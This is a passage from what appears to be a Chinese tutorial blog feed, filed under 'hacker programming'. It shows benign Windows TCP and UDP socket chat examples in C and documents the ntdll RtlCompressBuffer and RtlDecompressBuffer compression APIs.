class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">int</span> len = <span class="hljs-keyword">sizeof</span>(addr);<br>g_ClientSocket = accept(g_ServerSocket, (sockaddr*)(&amp;addr), &amp;len);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收客户端连接请求\n&quot;</span>);<br><span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-comment">//接收数据</span><br><span class="hljs-keyword">int</span> Ret = recv(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (Ret &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到数据：%s\n&quot;</span>, szBuffer);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span></span><br><span class="hljs-function"></span>&#123;<br>send(g_ClientSocket, pszSend, (<span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend)), <span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送数据：%s\n&quot;</span>, pszSend);<br>&#125;<br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span> </span>&#123;<br>AcceptRecvMsg();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h6 id="客户端代码："><a href="#客户端代码：" class="headerlink" title="客户端代码："></a>客户端代码：</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;WinSock2.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;Ws2_32.lib&quot;</span>)</span><br>SOCKET g_ServerSocket;<br><span class="hljs-function">BOOL <span class="hljs-title">Connection</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszServerIP, <span class="hljs-keyword">int</span> ServerPort)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RecvMsg</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入服务器IP\n&quot;</span>);<br><span class="hljs-keyword">char</span> ipaddr[<span class="hljs-number">32</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>gets_s(ipaddr);<br><span class="hljs-keyword">if</span> (Connection(ipaddr, <span class="hljs-number">12345</span>) == FALSE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;建立连接失败\n&quot;</span>);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;建立连接成功，开始通信\n&quot;</span>);<br><span class="hljs-keyword">char</span> szSend[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>gets_s(szSend);<br>SendMsg(szSend);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">Connection</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszServerIP, <span class="hljs-keyword">int</span> ServerPort)</span></span><br><span class="hljs-function"></span>&#123;<br>WSADATA wsaData = &#123; <span class="hljs-number">0</span> &#125;;<br>WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br>g_ServerSocket = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (g_ServerSocket == INVALID_SOCKET)<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br>addr.sin_family = AF_INET;<br>addr.sin_port = htons(ServerPort);<br>addr.sin_addr.S_un.S_addr = inet_addr(lpszServerIP);<br><br><span class="hljs-keyword">if</span> (connect(g_ServerSocket, (sockaddr*)(&amp;addr), <span class="hljs-keyword">sizeof</span>(addr)))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)RecvThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SendMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszSend)</span> </span>&#123;<br>send(g_ServerSocket, pszSend, (<span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(pszSend)), <span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送消息：%s\n&quot;</span>,pszSend);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RecvMsg</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-keyword">int</span> ret = recv(g_ServerSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到消息：%s\n&quot;</span>, szBuffer);<br>&#125;<br>&#125;<br><br><br><span class="hljs-function">UINT <span class="hljs-title">RecvThreadProc</span><span class="hljs-params">(LPVOID lpVoid)</span> </span>&#123;<br>RecvMsg();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>服务端</p><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/1.png"></p><p>客户端</p><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/2.png"></p><h4 id="基于UDP-Socket编程"><a href="#基于UDP-Socket编程" class="headerlink" title="基于UDP Socket编程"></a>基于UDP Socket编程</h4><h5 id="函数介绍-1"><a href="#函数介绍-1" class="headerlink" title="函数介绍"></a>函数介绍</h5><h6 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h6><p>将数据发送到特定的目的地</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sendto</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  SOCKET         s,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>     *buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">int</span>            len,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">int</span>            flags,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> sockaddr *to,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">int</span>            tolen</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>s：标识套接字的描述符。</p><p>buf：指向要发送的数据缓冲区的指针。</p><p>len：由buf参数指向的数据长度。</p><p>flags：指定一组调用方式的标志，一般为0。</p><p>to：指向包含目标套接字地址的sockaddr结构的可选指针。</p><p>tolen：由to参数指向的地址的大小。</p><p>返回值：如果没有发生错误，返回发送的总字节数，否则返回SOCKET_ERROR。</p><h6 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom"></a>recvfrom</h6><p>接收数据报并存储源地址</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">recvfrom</span>(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">  SOCKET   s,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">char</span>     *buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">int</span>      len,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">int</span>      flags,</span></span><br><span class="hljs-params"><span class="hljs-function">  sockaddr *<span class="hljs-keyword">from</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">int</span>      *fromlen</span></span><br><span class="hljs-params"><span class="hljs-function"></span>)</span>;<br></code></pre></div></td></tr></table></figure><p>s：标识套接字的描述符。</p><p>buf：指定传入数据的缓冲区。</p><p>len：由buf参数指向的数据长度。</p><p>flags：指定一组调用方式的标志，一般为0。</p><p>from：指向sockaddr结构中的缓冲区的可选指针，它将在返回时保存源地址。</p><p>fromlen：由from参数指向的地址的大小。</p><p>返回值：如果没有发生错误，返回接收到的总字节数，否则返回SOCKET_ERROR。</p><h5 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h5><p>UDP的通信框架比起TCP更加简单，UDP是基于无连接的通信，它可以直接使用sendto和recvfrom函数进行数据的发送与接收。</p><h6 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">bind</span><span class="hljs-params">()</span> </span>&#123;<br>WSADATA wsaData;<br>WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>serSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);<br><span class="hljs-keyword">if</span> (serSocket == INVALID_SOCKET)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket 错误\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>sockaddr_in serAddr;<br>serAddr.sin_family = AF_INET;<br>serAddr.sin_port = htons(<span class="hljs-number">12345</span>);<br>serAddr.sin_addr.S_un.S_addr = inet_addr(<span class="hljs-string">&quot;IP地址&quot;</span>);<br><span class="hljs-keyword">if</span> (bind(serSocket, (sockaddr*)&amp;serAddr, <span class="hljs-keyword">sizeof</span>(serAddr)) == SOCKET_ERROR)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;绑定失败\n&quot;</span>);<br>closesocket(serSocket);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (bind() == FALSE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开始通信\n&quot;</span>);<br>sockaddr_in remoteAddr;<br><span class="hljs-keyword">int</span> nAddrLen = <span class="hljs-keyword">sizeof</span>(remoteAddr);<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-keyword">char</span> recvData[MAX_PATH];<br><span class="hljs-keyword">int</span> ret = recvfrom(serSocket, recvData, MAX_PATH, <span class="hljs-number">0</span>, (sockaddr*)&amp;remoteAddr, &amp;nAddrLen);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>&#123;<br>recvData[ret] = <span class="hljs-number">0x00</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到信息：%s\n&quot;</span>,recvData);<br>&#125;<br><br><br><span class="hljs-keyword">char</span> sendData[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>gets_s(sendData);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送数据：%s\n&quot;</span>, sendData);<br>sendto(serSocket, sendData, <span class="hljs-built_in">strlen</span>(sendData), <span class="hljs-number">0</span>, (sockaddr*)&amp;remoteAddr, nAddrLen);<br><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h6 id="服务端：-1"><a href="#服务端：-1" class="headerlink" title="服务端："></a>服务端：</h6><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">bind</span><span class="hljs-params">()</span> </span>&#123;<br>    WORD socketVersion = <span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    WSADATA wsaData;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(socketVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    sclient = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bind</span>() == FALSE)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开始通信\n&quot;</span>);<br>    sockaddr_in sin;<br>    sin.sin_family = AF_INET;<br>    sin.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">12345</span>);<br>    sin.sin_addr.S_un.S_addr = <span class="hljs-built_in">inet_addr</span>(<span class="hljs-string">&quot;IP地址&quot;</span>);<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(sin);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br><br>        <span class="hljs-keyword">char</span> sendData[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>        <span class="hljs-built_in">gets_s</span>(sendData);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送数据：%s\n&quot;</span>, sendData);<br>        <span class="hljs-built_in">sendto</span>(sclient, sendData, <span class="hljs-built_in">strlen</span>(sendData), <span class="hljs-number">0</span>, (sockaddr*)&amp;sin, len);<br>        <span class="hljs-keyword">char</span> recvData[MAX_PATH];<br>        <span class="hljs-keyword">int</span> ret = <span class="hljs-built_in">recvfrom</span>(sclient, recvData, MAX_PATH, <span class="hljs-number">0</span>, (sockaddr*)&amp;sin, &amp;len);<br>        <span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>            recvData[ret] = <span class="hljs-number">0x00</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到信息：%s\n&quot;</span>,recvData);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h5><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/3.png"></p><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/4.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>传输技术</tag>
      
      <tag>SOCKET编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>压缩技术-windows压缩API</title>
    <link href="/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/"/>
    <url>/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/</url>
    
    <content type="html"><![CDATA[<h4 id="压缩技术"><a href="#压缩技术" class="headerlink" title="压缩技术"></a>压缩技术</h4><p>为了实现windows上的数据压缩和解压缩，最方便的方法就是直接调用win32API函数。windows系统的ntdll专门提供了RtlCompressBuffer和RtlDecompressBuffer函数来负责数据压缩和解压缩操作。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="RtlGetCompressionWorkSpaceSize"><a href="#RtlGetCompressionWorkSpaceSize" class="headerlink" title="RtlGetCompressionWorkSpaceSize"></a>RtlGetCompressionWorkSpaceSize</h5><p>确定RtlCompressBuffer和RtlDecompressBuffer函数工作空间缓冲区的正确大小。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">NT_RTL_COMPRESS_API NTSTATUS <span class="hljs-title">RtlGetCompressionWorkSpaceSize</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  USHORT CompressionFormatAndEngine,</span></span><br><span class="hljs-params"><span class="hljs-function">  PULONG CompressBufferWorkSpaceSize,</span></span><br><span class="hljs-params"><span class="hljs-function">  PULONG CompressFragmentWorkSpaceSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>CompressionFormatAndEngine：指定压缩格式和引擎类型。该参数必须设置为以下组合之一：</p><p>COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD</p><p>COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM</p><p>CompressBufferWorkSpaceSize：指向调用者分配的缓冲区指针，用于接受压缩缓冲区所需的大小。此值可确定RtlCompressBuffer的工作空间缓冲区的正确大小。</p><p>CompressFragmentWorkSpaceSize：一个指向可调用者分配缓冲区的指针，用于接收将压缩缓冲区解压缩为片段所需的大小。此值用于确定RtlDecompressFragment的工作空间缓冲区的正确大小。</p><p>返回值：返回STATUS_SUCCESS成功，否则失败。</p><h5 id="RtlCompressBuffer"><a href="#RtlCompressBuffer" class="headerlink" title="RtlCompressBuffer"></a>RtlCompressBuffer</h5><p>压缩一个可以由文件系统驱动程序使用的缓冲区，以促进文件压缩的实现。</p><figure class="highlight vbnet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbnet">NT_RTL_COMPRESS_API NTSTATUS RtlCompressBuffer(<br>  <span class="hljs-type">USHORT</span> CompressionFormatAndEngine,<br>  PUCHAR UncompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  UncompressedBufferSize,<br>  PUCHAR CompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  CompressedBufferSize,<br>  <span class="hljs-type">ULONG</span>  UncompressedChunkSize,<br>  PULONG FinalCompressedSize,<br>  PVOID  WorkSpace<br>);<br></code></pre></div></td></tr></table></figure><p>CompressionFormatAndEngine：指定压缩格式和引擎类型的位掩码，此参数必须设置为一种格式类型和一种引擎类型的有效按位或组合。相关值得含义如下：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>COMPRESSION_FORMAT_LZNT1</td><td>LZ压缩算法</td></tr><tr><td>COMPRESSION_FORMAT_XPRESS</td><td>Xpress压缩算法</td></tr><tr><td>COMPRESSION_FORMAT_XPRESS_HUFF</td><td>Huffman压缩算法</td></tr><tr><td>COMPRESSION_ENGINE_STANDARD</td><td>标准压缩算法</td></tr><tr><td>COMPRESSION_ENGINE_MAXIMUM</td><td>最大程序压缩</td></tr></tbody></table><p>UncompressedBuffer：指向要压缩的数据缓冲区的指针。该参数为必须不可为空。</p><p>UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小</p><p>CompressedBuffer：指向压缩之后数据缓冲区的指针，用于接收压缩数据。该参数为必须的不可以为空。</p><p>CompressedBufferSize：指定CompressedBuffer缓冲区的大小。</p><p>UncompressedChunkSize：指定压缩UncompressedBuffer缓冲区时使用块的大小。该参数必须是以下值之一：512、1024、2048或者4096。操作系统使用4096，因此此参数推荐值也是、4096。</p><p>FinalCompressedSize</p><p>指向调用者分配变量的指针，该变量接收存储在CompressedBuffer中的压缩数据的大小。该参数为必须的，不能为NULL。</p><p>WorkSpace：在压缩期间指定由RtlCompressBuffer函数使用的调用者分配的工作空间缓冲区的指针。使用RtlGetCompressionWorkSpaceSize函数可以确定工作缓冲区的正确大小。</p><p>返回值：返回STATUS_SUNCCESS表示成功，否则失败。</p><h5 id="RtlDecompressBuffer"><a href="#RtlDecompressBuffer" class="headerlink" title="RtlDecompressBuffer"></a>RtlDecompressBuffer</h5><p>解压缩整个压缩缓冲区</p><figure class="highlight vbnet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbnet">NT_RTL_COMPRESS_API NTSTATUS RtlDecompressBuffer(<br>  <span class="hljs-type">USHORT</span> CompressionFormat,<br>  PUCHAR UncompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  UncompressedBufferSize,<br>  PUCHAR CompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  CompressedBufferSize,<br>  PULONG 